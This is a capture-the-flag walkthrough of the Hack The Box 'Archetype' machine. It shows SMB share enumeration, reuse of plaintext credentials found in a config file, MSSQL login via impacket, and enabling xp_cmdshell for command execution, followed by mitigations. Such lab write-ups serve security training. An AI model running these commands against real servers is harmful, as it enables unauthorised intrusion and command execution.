> [!NOTE]
> **Machine notes.** Credentials and flags are redacted; output is illustrative.
> Complete the machine on Hack The Box for the real values.

## Executive summary

Archetype is the first Starting Point machine where credentials move between
services. SMB exposes a configuration file containing a password; MSSQL accepts
that password; the SQL service account has enough privilege to execute commands.

The lesson is credential flow: one exposed secret rarely ends at the service where
you found it.

## Machine information

| Field | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Archetype |
| Difficulty | Beginner (Starting Point, Tier 1) |
| Operating system | Windows |
| Category | MSSQL, SMB |
| Skills | SMB enumeration, MSSQL access, Impacket workflow |

## Objectives

- Enumerate SMB and identify a readable share with configuration data.
- Extract credentials from a backup or configuration file.
- Authenticate to MSSQL and determine the account's privileges.
- Use `xp_cmdshell` or an equivalent path to obtain execution.

## Tools used

| Tool | Purpose |
| --- | --- |
| `nmap` | Service discovery |
| `smbclient` | Share access |
| `impacket-mssqlclient` | Database interaction |
| `impacket-psexec` | Remote execution with credentials |

## Initial reconnaissance

```bash
nmap -Pn -sV -sC -p- <machine-ip> -oN nmap-archetype.txt
```

Expect SMB, MSSQL (1433) and possibly RDP. The presence of MSSQL is the signal to
look for database credentials rather than a web bug.

## Enumeration

```bash
smbclient -L //<machine-ip>/ -N
smbmap -H <machine-ip> -u ''
```

Look for a share named like a backup or support directory. List it and read small
files first:

```bash
smbclient //<machine-ip>/<share> -N
smb: \> ls
smb: \> get <config-file>
```

Configuration files frequently contain connection strings with plaintext
credentials — a finding in its own right.

## Vulnerability identification

Three linked issues:

1. **Unauthenticated share access** exposes configuration data.
2. **Plaintext credentials** in that data.
3. **Over-privileged service account** that can enable `xp_cmdshell`.

Any one alone is a finding; together they are a full compromise path.

## Exploitation

Authenticate to MSSQL with the discovered account:

```bash
impacket-mssqlclient <domain>/<user>:<password>@<machine-ip> -windows-auth
```

Check your role:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

If the account is `sysadmin`, command execution is available:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Capture the output as evidence. Do not enable persistence or create accounts.

> [!WARNING]
> `xp_cmdshell` executes as the SQL service account, which is often
> `NT SERVICE\MSSQLSERVER` with significant local privilege. Treat every command as
> privileged and keep them read-only.

## Privilege escalation

The service account commonly holds `SeImpersonatePrivilege`, which enables
token-impersonation escalation. On this machine the SQL account is already
sufficiently privileged, so the practical step is confirming identity:

```sql
EXEC xp_cmdshell 'whoami /priv';
```

If escalation were required, the pattern would be: identify the privilege, choose a
matching technique, and confirm the resulting token with `whoami`.

## Flags and completion evidence

Flags are redacted. Record:

- The share and file that contained the credential.
- The SQL role membership result.
- The output of `whoami` through `xp_cmdshell`.

## Lessons learned

- Backups and configuration files are credential sources.
- MSSQL access frequently equals command execution.
- Service accounts are over-privileged by default in many deployments.
- `SeImpersonatePrivilege` is a privilege-escalation primitive, not a detail.

## Mitigation and remediation

| Issue | Control |
| --- | --- |
| Readable backup share | Remove sensitive backups from shares |
| Plaintext credentials | Use a secret manager; rotate on exposure |
| `xp_cmdshell` enabled | Disable unless required, restrict execution |
| Over-privileged SQL account | Least privilege; separate service accounts |

## References

- Hack The Box — Starting Point: Archetype.
- Microsoft — `xp_cmdshell` documentation.
- MITRE ATT&CK — T1059 command execution.
